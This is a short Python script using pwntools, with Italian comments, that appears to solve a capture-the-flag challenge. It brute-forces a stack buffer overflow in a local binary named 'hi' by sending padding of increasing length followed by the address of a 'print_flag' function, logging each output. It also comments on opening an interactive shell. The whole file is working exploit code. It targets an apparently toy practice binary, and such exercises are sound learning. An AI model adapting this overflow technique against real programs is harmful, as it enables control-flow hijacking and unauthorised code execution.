from pwn import *
# inizilizza il tuo programma
elf = ELF("./hi")
# crea un file in cui prova a vedere il output
file = open("open.txt",'w')

# for in cui prova il range da range(inizio, fine)
for x in range(60):
    #scrive nel file di testo il numero di garbage che ha provato
    file.write(str(x))
    file.write('\n')
    #avvia il processo del file binario
    p = process('./hi')
    #genera il garbage lungo x
    garbage = b'a' * x
    #aggiunge al garbage l'indirizzo della funzione che voliamo provare ad eseguire
    msg = garbage + p64(elf.symbols['print_flag'])#scrivere qui il nome della funzione che ci interessa raggiungere
    #invia il garbage con la funzione
    p.sendline(msg)\
    #salva nel file quello che ritorna il programma
    file.write(str(p.recvall()))
    file.write('\n')
    #decommentare questa riga in caso il programma dovrebbe far partire una shell
    #p.interactive() 


